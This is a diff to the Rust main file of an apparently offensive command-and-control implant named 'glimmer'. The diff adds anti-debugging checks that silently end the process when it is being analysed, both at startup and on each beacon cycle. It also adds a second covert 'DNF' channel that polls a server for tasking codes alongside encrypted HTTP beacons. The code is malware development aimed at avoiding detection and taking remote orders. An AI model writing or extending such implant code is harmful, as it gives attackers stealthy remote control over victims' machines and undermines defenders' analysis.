@@ -1,3 +1,4 @@
+use glimmer::antidebug;
 use glimmer::c2::http::HTTPChannel;
 use glimmer::c2::{Channel, SendContext};
 use glimmer::cfg::Config;
@@ -7,10 +8,17 @@ use glimmer::proto::{CheckinData, Envelope, MsgType};
 use glimmer::sys;
 
 fn main() {
+
+    // Anti-debug checks
+    if antidebug::check() {
+        // exit silently, sleep forever, or alter behavior, exiting for now.
+        std::process::exit(0);
+    }
+
     let config = match Config::load("config.json") {
         Ok(c) => c,
         Err(_e) => {
-            glimmer::dbg_log!("[dev] config: {}", _e);
+            glimmer::dbg_log!("[beacon] config: {}", _e);
             std::process::exit(1);
         }
     };
@@ -24,7 +32,7 @@ fn main() {
     let server_pub = match config.server_public_key_bytes() {
         Ok(k) => k,
         Err(_e) => {
-            glimmer::dbg_log!("[dev] invalid server public key: {}", _e);
+            glimmer::dbg_log!("[beacon] config: invalid server public key: {}", _e);
             std::process::exit(1);
         }
     };
@@ -32,13 +40,13 @@ fn main() {
     let channel = match HTTPChannel::new(config.endpoints().to_vec()) {
         Ok(c) => c,
         Err(_e) => {
-            glimmer::dbg_log!("[dev] channel init failed: {}", _e);
+            glimmer::dbg_log!("[beacon] check-in channel init failed: {}", _e);
             std::process::exit(1);
         }
     };
 
     glimmer::dbg_log!(
-        "[dev] channel: {} (stealth={}, max={})",
+        "[beacon] check-in channel: {} (stealth={}, max={})",
         channel.info().name,
         channel.info().stealth,
         channel.info().max_payload
@@ -55,18 +63,26 @@ fn main() {
 
     let time_key = match bootstrap(&node_id, &checkin, &server_pub, &channel) {
         Ok(tk) => {
-            glimmer::dbg_log!("[dev] bootstrap complete, time-based key established");
+            glimmer::dbg_log!("[beacon] bootstrap complete, time-based key established");
             tk
         }
         Err(_e) => {
-            glimmer::dbg_log!("[dev] bootstrap failed: {}", _e);
+            glimmer::dbg_log!("[beacon] bootstrap failed: {}", _e);
             std::process::exit(1);
         }
     };
 
+    // DNF beacon channel
+    let dnf_channel = glimmer::c2::dnf::DnfChannel::new("127.0.0.1", 8080);
+
     // Phase 2: Layered encryption - time-based outer, ECIES inner. Sleep before first beacon
     loop {
         sleep_adaptive(config.beacon_interval());
+
+        if antidebug::check() {
+            // exit silently, sleep forever, or alter behavior, exiting for now, should probably sleep
+            std::process::exit(0);
+        }
 
         match send_layered(
             MsgType::Beacon,
@@ -76,8 +92,25 @@ fn main() {
             &server_pub,
             &channel,
         ) {
-            Ok(_) => { glimmer::dbg_log!("[dev] beacon sent [layered]"); },
-            Err(_e) => { glimmer::dbg_log!("[dev] beacon failed: {}", _e); },
+            Ok(_) => { glimmer::dbg_log!("[beacon] http beacon sent [layered]"); },
+            Err(_e) => { glimmer::dbg_log!("[beacon] http beacon failed: {}", _e); },
+        }
+
+        // Poll DNF channel for tasking
+        match dnf_channel.poll(&time_key) {
+            Ok(Some(_tasking)) => {
+                glimmer::dbg_log!(
+                    "[beacon] dnf poll complete. tasking received: code=0x{:02x} args=0x{:03x}",
+                    _tasking.task_code, _tasking.args
+                );
+                // TODO: dispatch tasking
+            }
+            Ok(None) => {
+                glimmer::dbg_log!("[beacon] dnf poll complete. no tasking");
+            }
+            Err(_e) => {
+                glimmer::dbg_log!("[beacon] dnf poll error: {}", _e);
+            }
         }
 
     }
